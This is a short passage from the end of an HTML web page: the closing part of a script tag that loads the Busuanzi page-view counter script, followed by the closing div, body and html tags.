src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>